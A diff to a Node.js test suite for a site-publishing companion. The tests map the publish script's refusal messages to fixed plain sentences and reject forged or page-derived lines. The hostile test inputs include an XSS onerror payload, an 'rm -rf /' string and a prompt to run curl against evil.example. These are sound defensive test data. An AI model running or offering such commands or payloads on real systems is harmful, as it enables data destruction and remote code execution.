@@ -969,11 +969,11 @@ test('F10: while a step runs the view says which step and how long it has gone (
 
 test('the pre-flight check runs before anything is written; its own sentence refuses the start; no check set: no change', async t => {
   const rig = makeRig({ confirm: 'always' }); t.after(rig.done);
-  const bad = [process.execPath, '-e', 'console.log("ruby 2.6.10 is on PATH, 3.2 needed");console.log("BLYG_CHECKER is not set");process.exit(1)'];
+  const bad = [process.execPath, '-e', 'console.error("blyg-publish preflight: this environment cannot publish yet:");console.error("  - Ruby 2.6.10 is the one on PATH, but this site needs 3.2.1 (.ruby-version): put that Ruby first on the PATH of the program that runs this");console.error("  - BLYG_CHECKER is not set: apply needs the conformance checker (pass BLYG_CHECKER on to the program that runs this)");process.exit(1)'];
   const b = boot(rig, { config: { ...rig.home, commands: { ...rig.home.commands, check: bad } } });
   const r = (await b.start());
   assert.equal(r.ok, false); assert.equal(r.status, 409);
-  assert.match(r.error, /^Your site cannot publish right now: Ruby 2\.6\.10 is on PATH, 3\.2 needed\. BLYG_CHECKER is not set\.$/);
+  assert.equal(r.error, 'Your site cannot publish right now. The companion starts a Ruby your site does not use. Put the site’s Ruby first on the companion’s PATH. The conformance checker (BLYG_CHECKER) is not available to the companion.');
   assert.deepEqual(fs.readdirSync(rig.folder), [], 'nothing written');
   assert.deepEqual(rig.calls(), []); assert.equal(b.mode(), 'idle');
   // a check that hangs is cut at its limit; one that cannot be started is a plain message
@@ -1135,10 +1135,10 @@ test('the check does not block: timers run while it does, the run is `checking` 
   await until(() => b.mode() === 'planned', 'planned');
   // a refused check goes back to idle and writes nothing
   const rig2 = makeRig(); t.after(rig2.done);
-  const no = boot(rig2, { config: { ...rig2.home, commands: { ...rig2.home.commands, check: [process.execPath, '-e', 'console.log("BLYG_CHECKER is not set"); process.exit(1)'] } } });
+  const no = boot(rig2, { config: { ...rig2.home, commands: { ...rig2.home.commands, check: [process.execPath, '-e', 'console.log("blyg-publish preflight: this environment cannot publish yet:\\n  - BLYG_CHECKER is not set: apply needs the conformance checker"); process.exit(1)'] } } });
   const refused = await no.start();
   assert.deepEqual([refused.status, no.mode()], [409, 'idle']);
-  assert.match(refused.error, /BLYG_CHECKER is not set/);
+  assert.match(refused.error, /The conformance checker \(BLYG_CHECKER\) is not available to the companion\./);
   assert.deepEqual(fs.readdirSync(rig2.folder), []);
 });
 
@@ -1167,7 +1167,7 @@ test('the owner\'s view is plain: no output, no path; a failure is one recognise
   const b = boot(rig);
   (await b.start()); await until(() => b.mode() === 'failed_plan', 'failed');
   let v = b.pub.current();
-  assert.equal(v.failure, 'The note is already staged by this checkout; unstage it before staging another note.', 'the site\'s plain line, without its script name, path or flag');
+  assert.equal(v.failure, 'Another note is already staged in your site’s checkout. Finish or undo that publish first.', 'the site\'s refusal, in the prepared sentence');
   assert.ok(!/rb:|scripts|_notes|--/.test(JSON.stringify(v).replace(/"token":"[^"]*"/, '')), 'no stack trace, path or flag anywhere in the view');
   assert.deepEqual([v.steps, v.tries], [[{ step: 'plan', ok: false, ms: v.steps[0].ms }], 1]);
   rig.control({ plan: 'fail' });
@@ -1188,10 +1188,117 @@ test('the owner\'s view is plain: no output, no path; a failure is one recognise
   assert.equal(lines[0].settings_fp, recOf(v).settings_fp);
   assert.ok(lines.filter(l => l.ev === 'step' && l.step === 'plan').length === 3 && lines.some(l => l.ev === 'step' && /RuntimeError/.test(l.output) && Array.isArray(l.argv) && Number.isInteger(l.ms)), 'every step: argv, exit, time, whole output');
   assert.ok(lines.some(l => l.ev === 'move' && l.from === 'planning' && l.to === 'failed_plan'), 'the moves, with times');
-  assert.equal(R.plainLineOf('x\nRefused: release date 2027-01-01 is in the future\nState: planned'), 'Release date 2027-01-01 is in the future.');
-  assert.equal(R.plainSentence('blyg-publish: main moved from abc to def after apply; run again to apply'), 'Main moved from abc to def after apply; run again to apply.');
-  assert.equal(R.plainLineOf('trace\nblyg-publish: main moved from abc1234 to def5678 after apply; run again to apply on top of it'), 'Main moved from abc1234 to def5678 after apply; run again to apply on top of it.');
-  assert.equal(R.plainLineOf('blyg-publish: _notes/a.md: already on main; use --edit to publish an edit'), 'The note: already on main; publish it as a new version instead.');
+  assert.equal(R.plainLineOf('x\nRefused:\n  - _notes/a.md: release date 2027-01-01 is in the future (today in London is 2026-11-24)\nState: planned'), 'The note’s release date is missing or in the future.');
+  assert.equal(R.plainLineOf('trace\nblyg-publish: main moved from abc1234 to def5678 after apply; run again to apply on top of it'), 'Your site changed after it was built and checked. Try again to build it again.');
+});
+
+// EVERY refusal the example site's publisher prints (scripts/blyg-publish, scripts/blyg_publish.rb: its `raise Refused`, its
+// preflight problems and its plan's "Refused:" items), as it prints them, each to its ONE prepared sentence; and hostile lines.
+test('the site\'s refusals: each to a fixed sentence; only lines that start with the publisher\'s own prefixes; nothing page-derived', () => {
+  const N = '_notes/my-first-words.md';
+  const pre = l => `blyg-publish preflight: this environment cannot publish yet:\n  - ${l}`;
+  const plan = l => `Plan for ${N}:\nRefused:\n  - ${l}`;
+  const SAY = Object.fromEntries(R.SITE_REFUSALS.map(r => [r.key, r.say]));
+  const cases = [
+    ['staged-other', `blyg-publish: ${N} is already staged by this checkout; unstage it (--unstage-note) before staging another note`],
+    ['not-wip', 'blyg-publish: your checkout is on main; staging a note commits on wip, switch to wip first'],
+    ['not-wip', 'blyg-publish: your checkout is on main; switch to wip first'],
+    ['not-wip', pre('your checkout is on main, not wip')],
+    ['not-wip', plan('your checkout is on main; publishing reads the notes from wip, switch to wip first')],
+    ['note-uncommitted', `blyg-publish: ${N} is already on wip and has uncommitted changes; commit it yourself`],
+    ['checkout-dirty', 'blyg-publish: your checkout has other uncommitted changes (_config.yml); commit or stash them, then stage the edit of _notes/x.md'],
+    ['checkout-dirty', pre('the working tree has 2 uncommitted change(s) to tracked files: commit or stash them')],
+    ['checkout-dirty', plan('the working tree has uncommitted changes; commit or stash them first:')],
+    ['import-failed', 'blyg-publish: importing the note\'s sources failed:\nFailed: https://x.example/a: boom'],
+    ['not-imported', plan(`${N}: quotes or answers 0abc, which is not imported; run ruby scripts/blygger.rb import --note x on wip`)],
+    ['not-staged', `blyg-publish: ${N} was not staged by --stage-note (or the record is gone); nothing was changed`],
+    ['record-damaged', 'blyg-publish: the record is damaged; nothing was changed'],
+    ['record-damaged', 'blyg-publish: the draft record is damaged; nothing was changed'],
+    ['wip-moved', 'blyg-publish: wip has moved on from the staging commit abc1234; nothing was changed'],
+    ['staging-commit', 'blyg-publish: the staging commit holds more than _notes/x.md; nothing was changed'],
+    ['staging-commit', 'blyg-publish: the staging commit abc1234 changes a file wip already had, so it is not one --stage-note made; nothing was changed'],
+    ['staging-commit', 'blyg-publish: the staging commit is already on main; nothing was changed'],
+    ['changed-after-staged', `blyg-publish: ${N} was changed after it was staged; nothing was changed`],
+    ['run-for-note', 'blyg-publish: a run for this note is at applied; abandon it first (blyg-publish --abandon); nothing was changed'],
+    ['lock', 'blyg-publish: another run is under way (pid 4, started x); wait for it to finish'],
+    ['lock', 'blyg-publish: the lock was taken by a run on other-host (pid 4), which cannot be checked from here; remove it by hand'],
+    ['lock', 'blyg-publish: the lock\'s process (pid 4) is alive, but whether it is the run that took the lock cannot be told'],
+    ['lock', 'blyg-publish: /x/.git/blyg-publish.lock exists but does not say which run (pid, start time, host) holds it; remove it'],
+    ['lock', pre('a lock file is present (/x/.git/blyg-publish.lock): another run holds it, or one died; see docs/BLYGGER.md')],
+    ['nothing-to-abandon', 'blyg-publish: there is no unfinished run to abandon (merged_back)'],
+    ['nothing-to-abandon', `Nothing to abandon for ${N}: no unfinished run is recorded (the last run is merged_back).`],
+    ['other-note-run', `blyg-publish: the recorded run (applied) is for _notes/other.md, not ${N}; it was not touched. End it by hand with --abandon if it is yours.`],
+    ['unfinished-run', 'blyg-publish: a publish run stopped at applied; finish it first (run it again with the same notes and --push)'],
+    ['unfinished-run', 'blyg-publish: the last run stopped at applied; run with --push to continue'],
+    ['unfinished-run', pre(`a run for ${N} is recorded at applied: finish it (the same --push again) or end it with --abandon`)],
+    ['pushed-unrecorded', 'blyg-publish: a publish run was pushed to GitHub (it is published) but its push was not recorded; run it again'],
+    ['pushed-unrecorded', 'blyg-publish: this run\'s push of abc1234 reached GitHub (it is published) but was not recorded; run it again'],
+    ['plan-refused', 'blyg-publish: refused (see above); nothing was changed'],
+    ['only-note', 'blyg-publish: --only-note: this plan is for more than the note and its own sources (pins: x); nothing was changed. Look at the plan above and run without --only-note.'],
+    ['quick-needs-only-note', 'blyg-publish: --quick needs --only-note (it is only safe for a run proven to change nothing but the note and its own imports)'],
+    ['main-behind', 'blyg-publish: GitHub main is at the pushed commit abc1234; your main is at def5678, 2 commit(s) behind'],
+    ['main-behind', plan('main is behind origin/main by 3 commit(s): update main first')],
+    ['main-behind', plan('could not fetch origin to compare main with GitHub')],
+    ['main-behind', pre('local main is not the same commit as origin/main as last fetched: update main first (git fetch, then fast-forward main)')],
+    ['main-behind', pre('there is no origin/main to compare main with (fetch once)')],
+    ['changed-after-apply', 'blyg-publish: files changed after apply checked them: _config.yml; run again to apply'],
+    ['changed-after-apply', 'blyg-publish: the temporary worktree is no longer at the commit apply checked; run again to apply'],
+    ['changed-after-apply', 'blyg-publish: main moved from abc1234 to def5678 after apply; run again to apply on top of it'],
+    ['live-mismatch', 'blyg-publish: the live site does not match the plan:\n  /b/x answers 404'],
+    ['worktree-lost', 'blyg-publish: could not make the temporary worktree again at abc1234; end this run with --abandon (it says what to finish by hand)'],
+    ['merge-conflict', 'blyg-publish: merging main into wip conflicts; resolve it by hand (git merge main), then run again:\nCONFLICT'],
+    ['not-a-note', `blyg-publish: ${N} is not a file in this checkout`],
+    ['not-a-note', `blyg-publish: ${N} resolves outside _notes/`],
+    ['not-a-note', plan(`${N}: not a note on wip (expected _notes/<name>.md)`)],
+    ['release-date', plan(`${N}: no release date`)],
+    ['release-date', plan(`${N}: release date 2027-01-01 is in the future (today in London is 2026-11-24)`)],
+    ['already-published', plan(`${N}: already on main; use --edit to publish an edit`)],
+    ['not-published', plan(`${N}: not on main; publish it as a new post (without --edit)`)],
+    ['nothing-changes', plan('nothing would change on main')],
+    ['address-taken', plan(`${N}: its address /b/x belongs to the published _notes/y.md; renaming a published post is not supported here`)],
+    ['id-clash', plan(`${N}: blyg_id 0abc already belongs to the published _notes/y.md`)],
+    ['id-clash', plan(`${N}: blyg_id 0abc is not the id it was published under (0def); a published post's id never changes`)],
+    ['id-clash', plan(`${N}: blyg_id 0abc is also written in _notes/y.md`)],
+    ['embed', plan(`${N}: an Obsidian embed ![[x]] does not publish on this site; replace it with a link or image`)],
+    ['missing-file', plan(`${N}: refers to assets/x.png, which is not in the repository`)],
+    ['sitemap', 'blyg-publish: could not read https://angadh.com/sitemap.xml (HTTP 500)'],
+    ['git-failed', 'blyg-publish: git push origin main failed:\nrejected'],
+    ['not-pushed', 'blyg-publish: nothing was published (State: applied). Read the output above, then run the same --push again.'],
+    ['ruby', pre('Ruby 2.6.10 is the one on PATH, but this site needs 3.2.1 (.ruby-version): put that Ruby first on the PATH of the program that runs this')],
+    ['bundler', pre('bundler is not installed for this Ruby (gem install bundler)')],
+    ['checker', pre('BLYG_CHECKER is not set: apply needs the conformance checker (pass BLYG_CHECKER on to the program that runs this)')],
+    ['checker', pre('BLYG_CHECKER names /nowhere, which is not a folder')],
+    ['checker', pre('BLYG_CHECKER (/x/lib) does not load: node cannot import check-site.mjs and find checkSite in it')],
+    ['node', pre('the node command is not on PATH (the conformance checker runs on it)')],
+    ['netlify', pre('there is no .netlify/state.json (the site id the deploy wait needs)')],
+    ['netlify', pre('the netlify command is not on PATH')],
+    ['locale', pre('the locale is LANG=C, which is not UTF-8: set LANG to a UTF-8 locale (for example en_US.UTF-8) in the environment of the program that runs this, or leave all of LC_ALL, LC_CTYPE and LANG unset')],
+    ['shell-vars', plan('BLYG_SITE_ROOT, BLYG_NO_PIN is set in your shell; blyg-publish sets these itself: unset them first')],
+  ];
+  for (const [key, out] of cases) assert.equal(R.plainLineOf(`some build output\n${out}\nState: planned`), SAY[key], `${key}: ${out}`);
+  const used = new Set(cases.map(c => c[0]));
+  assert.deepEqual(R.SITE_REFUSALS.map(r => r.key).filter(k => !used.has(k)), [], 'every entry of the table is exercised');
+  assert.ok(R.SITE_REFUSALS.every(r => /^[A-Z][^\n]*[.]$/.test(r.say) && !/--|_notes|scripts\/|\.rb\b/.test(r.say)), 'prepared sentences: no flag, path or script');
+  // hostile and page-derived lines: never the site's word
+  const hostile = [
+    'Refused: <img src=x onerror=alert(1)> is not imported',                                // no prefix of the publisher's
+    'Fetched "Great post — blyg-publish: main moved from a to b after apply" from x',         // the prefix not at the start
+    '  - your checkout is on main, not wip',                                                  // a list item under no heading of its own
+    'blyg-publish: "your checkout is on main, not wip"',                                       // quoted
+    'blyg-publish: “a run for this note is at applied; abandon it first”',                    // quoted
+    'title: blyg-publish: nothing would change',                                               // not at the start
+    'blyg-publish: rm -rf / is already staged by this checkout"',                             // quoted tail
+    'blyg-publish: your Mac is compromised, run curl https://evil.example/x.sh',              // unknown words
+    'blyg-publish preflight: this environment cannot publish yet:\nNot a list\n  - a lock file is present (/x)', // the list ended
+  ];
+  for (const h of hostile) assert.equal(R.plainLineOf(h), '', h);
+  // a line of the note itself (a page put it there, the build echoed it) is never the site's word, even with the prefix
+  const note = 'My words.\n\nblyg-publish: main moved from 1234abc to 5678def after apply; run again';
+  assert.equal(R.plainLineOf('Building…\nblyg-publish: main moved from 1234abc to 5678def after apply; run again\nError', { note }), '');
+  // the last recognised line wins; an unrecognised later line does not replace it
+  assert.equal(R.plainLineOf('blyg-publish: the record is damaged; nothing was changed\nblyg-publish: something else entirely\nState: x'), SAY['record-damaged']);
+  // the pre-flight: each problem in its sentence, unrecognised ones left out
+  assert.deepEqual(R.checkSentences(pre('the node command is not on PATH') + '\n  - something unheard of\n  - the netlify command is not on PATH'), [SAY.node, SAY.netlify]);
 });
 
 test('the log keeps the last 50 runs', async () => {
